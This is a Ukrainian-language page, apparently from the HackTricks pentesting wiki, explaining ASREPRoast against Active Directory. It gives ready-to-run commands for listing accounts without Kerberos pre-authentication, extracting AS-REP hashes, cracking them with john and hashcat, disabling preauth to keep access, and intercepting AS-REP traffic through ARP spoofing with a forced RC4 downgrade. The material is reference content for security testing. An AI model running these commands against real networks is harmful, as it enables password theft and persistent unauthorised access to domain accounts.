# ASREPRoast

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

Join [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server to communicate with experienced hackers and bug bounty hunters!

**Hacking Insights**\
Engage with content that delves into the thrill and challenges of hacking

**Real-Time Hack News**\
Keep up-to-date with fast-paced hacking world through real-time news and insights

**Latest Announcements**\
Stay informed with the newest bug bounties launching and crucial platform updates

**Join us on** [**Discord**](https://discord.com/invite/N3FrSbmwdy) and start collaborating with top hackers today!

## ASREPRoast

ASREPRoast - це атака безпеки, яка експлуатує користувачів, які не мають **атрибута, що вимагає попередньої аутентифікації Kerberos**. По суті, ця вразливість дозволяє зловмисникам запитувати аутентифікацію для користувача у Контролера домену (DC) без необхідності знати пароль користувача. DC потім відповідає повідомленням, зашифрованим за допомогою ключа, отриманого з пароля користувача, який зловмисники можуть спробувати зламати офлайн, щоб дізнатися пароль користувача.

Основні вимоги для цієї атаки:

* **Відсутність попередньої аутентифікації Kerberos**: Цільові користувачі не повинні мати цю функцію безпеки увімкненою.
* **З'єднання з Контролером домену (DC)**: Зловмисники повинні мати доступ до DC, щоб надсилати запити та отримувати зашифровані повідомлення.
* **Необліковий доменний акаунт**: Наявність доменного акаунта дозволяє зловмисникам більш ефективно ідентифікувати вразливих користувачів через LDAP-запити. Без такого акаунта зловмисники повинні вгадувати імена користувачів.

#### Перерахування вразливих користувачів (потрібні доменні облікові дані)

{% code title="Using Windows" %}
```bash
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```
{% endcode %}

{% code title="Використання Linux" %}
```bash
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
{% endcode %}

#### Запит AS\_REP повідомлення

{% code title="Використовуючи Linux" %}
```bash
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```
{% endcode %}

{% code title="Використання Windows" %}
```bash
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
{% endcode %}

{% hint style="warning" %}
AS-REP Roasting з Rubeus згенерує 4768 з типом шифрування 0x17 та типом попередньої автентифікації 0.
{% endhint %}

### Ломка
```bash
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### Постійність

Примусьте **preauth** не вимагати для користувача, де у вас є **GenericAll** дозволи (або дозволи на запис властивостей):

{% code title="Using Windows" %}
```bash
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```
{% endcode %}

{% code title="Використання Linux" %}
```bash
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH
```
{% endcode %}

## ASREProast без облікових даних

Зловмисник може використовувати позицію "людина посередині", щоб захопити пакети AS-REP під час їх проходження через мережу, не покладаючись на відключення попередньої автентифікації Kerberos. Тому це працює для всіх користувачів у VLAN.\
[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) дозволяє нам це зробити. Більше того, інструмент змушує робочі станції клієнтів використовувати RC4, змінюючи переговори Kerberos.
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## Посилання

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)

***

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

Приєднуйтесь до [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) сервера, щоб спілкуватися з досвідченими хакерами та шукачами вразливостей!

**Інсайти з хакінгу**\
Залучайтеся до контенту, який занурюється у захоплення та виклики хакінгу

**Новини хакінгу в реальному часі**\
Будьте в курсі швидкоплинного світу хакінгу через новини та інсайти в реальному часі

**Останні оголошення**\
Залишайтеся в курсі нових програм винагород за вразливості та важливих оновлень платформ

**Приєднуйтесь до нас на** [**Discord**](https://discord.com/invite/N3FrSbmwdy) і почніть співпрацювати з провідними хакерами вже сьогодні!

{% hint style="success" %}
Вчіться та практикуйте хакінг AWS:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Вчіться та практикуйте хакінг GCP: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Підтримати HackTricks</summary>

* Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи в телеграмі**](https://t.me/peass) або **слідкуйте** за нами в **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Діліться хакерськими трюками, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на github.

</details>
{% endhint %}
